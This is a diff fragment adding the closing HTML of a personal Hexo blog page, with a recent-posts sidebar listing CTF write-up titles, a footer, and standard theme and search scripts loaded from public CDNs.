+</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%B8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cc1-cc7/" title="复习一下反序列化 cc1-cc7"><img src="/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="复习一下反序列化 cc1-cc7"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%B8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cc1-cc7/" title="复习一下反序列化 cc1-cc7">复习一下反序列化 cc1-cc7</a><time datetime="2024-06-07T15:27:00.000Z" title="发表于 2024-06-07 23:27:00">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/java/Fastjson/" title="Fastjson"><img src="/img/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Fastjson"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/java/Fastjson/" title="Fastjson">Fastjson</a><time datetime="2024-06-07T15:26:21.000Z" title="发表于 2024-06-07 23:26:21">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/IT%E6%97%A5%E5%B8%B8/hexo%E9%AD%94%E6%94%B9/" title="hexo魔改"><img src="/img/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo魔改"/></a><div class="content"><a class="title" href="/2024/06/07/IT%E6%97%A5%E5%B8%B8/hexo%E9%AD%94%E6%94%B9/" title="hexo魔改">hexo魔改</a><time datetime="2024-06-07T15:21:11.000Z" title="发表于 2024-06-07 23:21:11">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/python/%E5%86%85%E5%AD%98%E9%A9%AC/" title="无题"><img src="/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/python/%E5%86%85%E5%AD%98%E9%A9%AC/" title="无题">无题</a><time datetime="2024-06-07T15:14:08.002Z" title="发表于 2024-06-07 23:14:08">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/Writeups/HITCON/login%20system/" title="login system"><img src="/img/23.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="login system"/></a><div class="content"><a class="title" href="/2024/06/07/Writeups/HITCON/login%20system/" title="login system">login system</a><time datetime="2024-06-07T13:37:43.000Z" title="发表于 2024-06-07 21:37:43">2024-06-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By dionysus</div><div class="footer_custom_text">此心安处是吾乡</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><canvas id="snow"></canvas><script async src="/js/snow.js"></script><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><script async data-pjax src="/js/randombg.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><!-- hexo injector body_end end --></body></html>
